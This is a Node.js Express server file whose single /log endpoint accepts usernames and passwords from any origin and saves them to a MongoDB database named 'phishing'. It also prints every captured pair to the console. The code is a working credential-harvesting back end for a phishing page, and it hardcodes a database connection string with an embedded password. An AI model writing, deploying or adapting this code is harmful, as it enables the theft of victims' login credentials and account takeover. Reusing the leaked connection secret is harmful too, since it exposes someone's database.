const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const cors = require('cors'); // Ensure CORS is installed and required

const app = express();
const PORT = process.env.PORT || 3000;

// Connect to MongoDB Atlas
const mongoUri = process.env.MONGODB_URI || 'mongodb+srv://zamprognomicheal22:hRF8UQvfSDxf0xJc@mycluster.6cxeu.mongodb.net/phishing?retryWrites=true&w=majority&appName=MyCluster';
mongoose.connect(mongoUri)
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('Failed to connect to MongoDB:', err));

// Define a schema for login data
const loginSchema = new mongoose.Schema({
  username: String,
  password: String,
  timestamp: { type: Date, default: Date.now },
});

const LoginData = mongoose.model('LoginData', loginSchema);

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Enable CORS
app.use(cors({
  origin: '*', // Allow all origins (replace with your frontend URL in production)
  methods: ['GET', 'POST', 'OPTIONS'], // Allow these HTTP methods
  allowedHeaders: ['Content-Type', 'Authorization'], // Allow these headers
}));

// Endpoint to handle login data
app.post('/log', (req, res) => {
  console.log('Request Body:', req.body); // Debug log to check the request body
  const { username, password } = req.body; // Extract username and password from the request body
  console.log('Received login data:', { username, password }); // Debug log

  const loginData = new LoginData({ username, password }); // Save as a single entry
  loginData.save()
    .then(() => {
      console.log('Login data saved:', { username, password });
      res.status(200).send('Login data saved');
    })
    .catch(err => {
      console.error('Failed to save login data:', err);
      res.status(500).send('Failed to save login data');
    });
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});